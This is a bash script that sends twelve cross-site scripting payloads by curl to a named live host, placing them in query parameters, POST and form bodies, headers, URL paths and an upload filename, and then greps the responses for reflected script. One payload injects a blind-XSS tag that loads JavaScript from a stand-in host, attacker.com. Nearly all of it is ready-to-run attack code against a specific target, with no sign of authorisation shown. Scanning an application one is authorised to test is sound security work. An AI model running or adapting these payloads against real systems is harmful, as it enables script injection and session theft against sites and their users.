#!/bin/bash
echo "======================================"
echo "TESTING XSS VULNERABILITIES - api.thesecurityteam.rocks"
echo "======================================"
echo

TARGET="api.thesecurityteam.rocks"
PROTOCOL="https"
FULL_URL="https://api.thesecurityteam.rocks"

echo "[INFO] Starting XSS vulnerability testing..."
echo "[TARGET] $FULL_URL"
echo "[TIME] $(date)"
echo

# Test 1: Basic XSS in parameters
echo "[TEST 1] Testing basic XSS in query parameters..."
curl -s -k -X GET "$PROTOCOL://$TARGET/?param=<script>alert('XSS')</script>" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" --connect-timeout 10 --max-time 30 > xss_test1.txt
echo "[RESULT] Check xss_test1.txt for XSS payloads"
echo

# Test 2: XSS in POST data
echo "[TEST 2] Testing XSS in POST data..."
curl -s -k -X POST "$PROTOCOL://$TARGET/api/test" -H "Content-Type: application/json" -d '{"username":"<script>alert(String.fromCharCode(88,83,83))</script>","password":"test"}' -H "User-Agent: Mozilla/5.0" --connect-timeout 10 --max-time 30 > xss_test2.txt
echo "[RESULT] Check xss_test2.txt for reflected XSS in POST data"
echo

# Test 3: XSS in headers
echo "[TEST 3] Testing XSS in custom headers..."
curl -s -k -X GET "$PROTOCOL://$TARGET/" -H "X-Forwarded-For: <img src=x onerror=alert('XSS')>" -H "X-Real-IP: <script>alert('XSS')</script>" --connect-timeout 10 --max-time 30 > xss_test3.txt
echo "[RESULT] Check xss_test3.txt for XSS in headers"
echo

# Test 4: XSS in path parameters
echo "[TEST 4] Testing XSS in path parameters..."
curl -s -k -X GET "$PROTOCOL://$TARGET/users/<script>alert('XSS')</script>" -H "User-Agent: Mozilla/5.0" --connect-timeout 10 --max-time 30 > xss_test4.txt
echo "[RESULT] Check xss_test4.txt for XSS in path"
echo

# Test 5: DOM-based XSS testing
echo "[TEST 5] Testing DOM-based XSS in URL fragments..."
curl -s -k -X GET "$PROTOCOL://$TARGET/#<script>alert('DOM-XSS')</script>" -H "User-Agent: Mozilla/5.0" --connect-timeout 10 --max-time 30 > xss_test5.txt
echo "[RESULT] Check xss_test5.txt for DOM-based XSS"
echo

# Test 6: XSS with various encodings
echo "[TEST 6] Testing XSS with URL encoding..."
curl -s -k -X GET "$PROTOCOL://$TARGET/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" --connect-timeout 10 --max-time 30 > xss_test6.txt
echo "[RESULT] Check xss_test6.txt for encoded XSS payloads"
echo

# Test 7: XSS in JSON body with various content types
echo "[TEST 7] Testing XSS in JSON body with different content types..."
curl -s -k -X POST "$PROTOCOL://$TARGET/api/login" -H "Content-Type: application/x-www-form-urlencoded" -d "username=<script>alert('XSS')</script>&password=test" --connect-timeout 10 --max-time 30 > xss_test7.txt
echo "[RESULT] Check xss_test7.txt for XSS in form-encoded data"
echo

# Test 8: XSS with null bytes and special characters
echo "[TEST 8] Testing XSS with null bytes and special characters..."
curl -s -k -X GET "$PROTOCOL://$TARGET/?input=%00<script>alert('XSS')</script>" --connect-timeout 10 --max-time 30 > xss_test8.txt
echo "[RESULT] Check xss_test8.txt for XSS with null bytes"
echo

# Test 9: XSS in User-Agent header (reflection test)
echo "[TEST 9] Testing XSS in User-Agent header reflection..."
curl -s -k -X GET "$PROTOCOL://$TARGET/" -H "User-Agent: <script>alert(navigator.userAgent)</script>" --connect-timeout 10 --max-time 30 > xss_test9.txt
echo "[RESULT] Check xss_test9.txt for User-Agent reflection"
echo

# Test 10: Blind XSS testing
echo "[TEST 10] Testing Blind XSS with external requests..."
curl -s -k -X POST "$PROTOCOL://$TARGET/api/feedback" -H "Content-Type: application/json" -d '{"message":"<script src=//attacker.com/blind-xss.js></script>"}' --connect-timeout 10 --max-time 30 > xss_test10.txt
echo "[RESULT] Check xss_test10.txt for Blind XSS attempts"
echo

# Test 11: XSS with SVG and HTML entities
echo "[TEST 11] Testing XSS with SVG and HTML entities..."
curl -s -k -X GET "$PROTOCOL://$TARGET/?input=<svg/onload=alert('XSS')>" --connect-timeout 10 --max-time 30 > xss_test11.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/?data=&lt;script&gt;alert('XSS')&lt;/script&gt;" --connect-timeout 10 --max-time 30 >> xss_test11.txt
echo "[RESULT] Check xss_test11.txt for SVG and entity-based XSS"
echo

# Test 12: XSS in file upload filename
echo "[TEST 12] Testing XSS in file upload scenarios..."
curl -s -k -X POST "$PROTOCOL://$TARGET/api/upload" -F "file=@<script>alert('XSS').txt" --connect-timeout 10 --max-time 30 > xss_test12.txt
echo "[RESULT] Check xss_test12.txt for file upload XSS"
echo

echo "[COMPLETED] XSS testing completed. Review all xss_test*.txt files for potential vulnerabilities."
echo "[TIME] $(date)"
echo

# Analyze results for XSS indicators
echo "[ANALYSIS] Searching for XSS indicators in results..."
grep -i "alert\|<script>\|javascript:\|onerror=\|onload=" *.txt > xss_indicators.txt 2>/dev/null
if [ -s xss_indicators.txt ]; then
    echo "[WARNING] Potential XSS indicators found! Check xss_indicators.txt"
else
    echo "[INFO] No obvious XSS indicators in response bodies"
fi

# Check for reflected parameters
echo "[REFLECTION CHECK] Checking for parameter reflection..."
for file in xss_test*.txt; do
    if [ -f "$file" ]; then
        echo "=== Analyzing $file ===" >> reflection_check.txt
        grep -i "<script>\|alert\|onerror\|onload" "$file" >> reflection_check.txt 2>/dev/null
        echo "" >> reflection_check.txt
    fi
done

if [ -s reflection_check.txt ]; then
    echo "[WARNING] Potential reflected XSS found! Check reflection_check.txt"
fi

echo

echo "XSS testing phase completed successfully."
read -p "Press Enter to continue..."